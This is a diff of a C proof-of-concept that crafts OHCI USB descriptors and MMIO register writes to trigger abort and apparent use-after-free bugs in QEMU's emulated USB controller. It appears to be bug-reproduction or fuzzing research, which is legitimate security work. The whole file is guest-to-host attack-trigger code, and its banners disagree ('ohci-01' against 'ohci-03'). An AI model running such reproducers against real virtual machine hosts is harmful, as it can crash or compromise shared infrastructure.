@@ -106,79 +106,6 @@ typedef struct ohci_iso_td {
     uint16_t offset[8];
 } ohci_iso_td;
 
-static void craft_hcca0_intr0(ohci_hcca *hcca) {
-    ohci_ed *ed0 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
-    uint64_t ed0_phys = gva_to_gpa(ed0);
-    ohci_ed *ed1 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
-    uint64_t ed1_phys = gva_to_gpa(ed1);
-
-    ohci_td *td0 = (ohci_td *)calloc_256aligned(sizeof(ohci_td));
-    uint64_t td0_phys = gva_to_gpa(td0);
-
-    uint32_t *cbw = (uint32_t *)calloc_256aligned(0x20);
-    cbw[0] = 0x43425355;
-    cbw[1] = 0x00000000;
-    cbw[2] = 0x00000000;
-    cbw[3] = 0x03000000;
-    cbw[4] = 0x81ea9dd0;
-    cbw[5] = 0x81ea9dd0;
-    cbw[6] = 0x81ea9dd0;
-    cbw[7] = 0x00ea9dd0;
-    uint64_t cbw_phys = gva_to_gpa(cbw);
-
-    td0->flags = 0xb548ffdd;
-    td0->cbp = cbw_phys;
-    td0->be = cbw_phys + 0x1f - 1;
-
-    ed0->flags = 0xda9d3900;
-    ed0->next = (uint32_t)ed1_phys;
-    ed0->head = (uint32_t)td0_phys;
-
-    hcca->intr[0] = ed0_phys;
-}
-
-static void craft_hcca0_intr1(ohci_hcca *hcca) {
-    ohci_ed *ed0 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
-    uint64_t ed0_phys = gva_to_gpa(ed0);
-    ohci_ed *ed1 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
-    uint64_t ed1_phys = gva_to_gpa(ed1);
-
-    ohci_td *td0 = (ohci_td *)calloc_256aligned(sizeof(ohci_td));
-    uint64_t td0_phys = gva_to_gpa(td0);
-
-    uint32_t *cbw = (uint32_t *)calloc_256aligned(0xe28);
-    uint64_t cbw_phys = gva_to_gpa(cbw);
-
-    td0->flags = 0x0;
-    td0->cbp = cbw_phys;
-    td0->be = cbw_phys + 0xe28 - 1;
-
-    ed0->flags = 0x1a31080;
-    ed0->next = (uint32_t)ed1_phys;
-    ed0->head = (uint32_t)td0_phys;
-
-    hcca->intr[1] = ed0_phys;
-}
-
-static void craft_hcca0_intr2(ohci_hcca *hcca) {
-    ohci_ed *ed0 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
-    uint64_t ed0_phys = gva_to_gpa(ed0);
-
-    ohci_iso_td *iso_td0 = (ohci_iso_td *)calloc_256aligned(sizeof(ohci_iso_td));
-    uint64_t iso_td0_phys = gva_to_gpa(iso_td0);
-
-    iso_td0->flags = 0xa4200000;
-    iso_td0->bp = 0x22a2edc3;
-    iso_td0->be = 0x1173548;
-    iso_td0->offset[2] = 0x749b;
-    iso_td0->offset[3] = 0xcbe3;
-
-    ed0->flags = 0xadb9080;
-    ed0->head = (uint32_t)iso_td0_phys;
-
-    hcca->intr[2] = ed0_phys;
-}
-
 int main(int argc, char **argv) {
     printf("[+]\n[+] Reproduce ohci-01: abort in ohci_frame_boundary!\n[+]\n");
 
@@ -222,28 +149,62 @@ int main(int argc, char **argv) {
     printf("[+] ohci PCI_CONFIG.Command = 0x%x\n", (uint16_t)command_status);
     sleep(1);
 
+    // set up dependent buffers
+    uint32_t *cbw = (uint32_t *)calloc_256aligned(0x20);
+    uint64_t cbw_phys = gva_to_gpa(cbw);
+    cbw[0] = 0x43425355;
+    cbw[1] = 0x00000000;
+    cbw[2] = 0x00000000;
+    cbw[3] = 0x03000000;
+    cbw[4] = 0x402056e8;
+    cbw[5] = 0x402056e8;
+    cbw[6] = 0x402056e8;
+    cbw[7] = 0x002056e8;
+
+    ohci_hcca *hcca0 = (ohci_hcca *)calloc_256aligned(sizeof(ohci_hcca));
+    uint64_t hcca0_phys = gva_to_gpa(hcca0);
+
+    ohci_ed *ed0 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
+    uint64_t ed0_phys = gva_to_gpa(ed0);
+    ohci_td *td0 = (ohci_td *)calloc_256aligned(sizeof(ohci_td));
+    uint64_t td0_phys = gva_to_gpa(td0);
+    td0->cbp = cbw_phys;
+    td0->be = cbw_phys + 0x1f - 1;
+    ed0->flags = 0x685f0900;
+    ed0->head = td0_phys;
+
+    ohci_ed *ed1 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
+    uint64_t ed1_phys = gva_to_gpa(ed1);
+    ohci_td *td1 = (ohci_td *)calloc_256aligned(sizeof(ohci_td));
+    uint64_t td1_phys = gva_to_gpa(td1);
+    td1->flags = 0x90000000;
+    td1->cbp = cbw_phys;
+    td1->be = cbw_phys + 0x1f - 1;
+    ed1->flags = 0x08303080;
+    ed1->head = td1_phys;
+
+    hcca0->intr[0] = ed0_phys;
+    hcca0->intr[1] = ed1_phys;
+
     // GDB
     // gef config context.nb_lines_backtrace 2
     // b ../hw/usb/hcd-ohci.c:1591
-    // b ohci_child_detach
- 
-    ohci_hcca *hcca0 = (ohci_hcca *)calloc_256aligned(sizeof(ohci_hcca));
-    craft_hcca0_intr0(hcca0); // prepare
-    craft_hcca0_intr1(hcca0); // prepare
-    craft_hcca0_intr2(hcca0); // allocate and free
-    uint64_t hcca0_phys = gva_to_gpa(hcca0);
 
-    // step 1: make dev-storage USB_MSDM_CSW
-    mmio_write(0x8, 0x1);
-    mmio_write(0x54, 0x0f5a8a46);
-    mmio_write(0xc, 0x14b7f9fc);
-    mmio_write(0x18, hcca0_phys);
-    mmio_write(0x4, 0x33161e26 | 0x80);
+    // reset
+    mmio_write(0x8/*hccommandstatus*/, 0x1/*OHCI_STATUS_HCR*/);
+    // set up ports
+    mmio_write(0x54, 0x4e33b4bf);
+    // set ohci->ctl and enable OHCI_CTL_PLE (0x4)
+    mmio_write(0x4/*hccontrol*/, 0x1fd0290e | 0xc0);
+    // fill hcca and make sure hcca.intr (ED) is available
+    mmio_write(0x18/*hchcca*/, hcca0_phys/*OHCI_CTL_PLE*/);
+    mmio_write(0x4/*hccontrol*/, 0x1fd0298e | 0x80);
     sleep(1);
-    mmio_write(0x4, 0x33161e26 | 0xc0);
-    mmio_write(0x4, 0x4993d90b); // use
+    mmio_write(0x4/*hccontrol*/, 0x1fd0298e | 0xc0);
+    mmio_write(0x54, 0x4e33b4bf); // ohci_port_set_status
+    mmio_write(0x4, 0x3d8d323a); // ohci_roothub_reset
 
-    printf("[+]\n[+] Reproduce ohci-02: failed!\n[+]\n");
+    printf("[+]\n[+] Reproduce ohci-03: failed!\n[+]\n");
 
     return 0;
 }
